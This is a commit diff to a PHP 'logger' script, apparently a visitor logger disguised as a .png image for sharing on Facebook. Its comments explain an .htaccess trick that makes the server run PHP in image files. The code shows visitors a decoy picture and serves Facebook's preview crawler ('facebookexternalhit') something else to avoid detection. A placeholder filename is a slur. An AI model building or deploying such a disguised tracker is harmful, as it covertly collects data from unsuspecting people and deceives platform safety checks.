79c30a59d8d66e11bdb20e3d267123284f238eba
typhoid <typhoidfever@californiacolleges.edu>
2016-02-01 11:08:35 -0500

    Update logger.php

--- logger.php
+++ logger.php
@@ -2,8 +2,8 @@
 //creditz 2 @typhoid
 //FB edition
 //--IMPORTANT-- put this in .htmlaccess without quotation marks " AddType application/x-httpd-php .png "
-//replace h were it says .png in the line added to the htmlaccess with 
-//whatever you  save this php file as. if you're keeping it as it is then save this logger file as .png on the server
+//replace h were it says .png in the line added to the htmlaccess with whatever you  save this php file as.
+// if you're keeping it as it is then save this logger file as .png on the server
 //special thanks to ozkar  
 extract($_SERVER);
 
@@ -11,7 +11,8 @@ extract($_SERVER);
 //open jpg image and set it as the display for the page. can use other image type but must be different than the extension put into htmlaccess
 $name = 'picturename.jpg';
 //replace this with file of choice. could be super low quality blurry copy of picturename.jpg or textfile saying preview not available idk
-$zuckerberg = 'fggt.txt'
+$zuckerberg = 'fggt.txt';
+//check to see if facebook is trying to make a preview of the image. we want to show them something else.
 if($HTTP_USER_AGENT =='facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)')
 {
 // change 'r' below to rb if using another picture instead of a text file
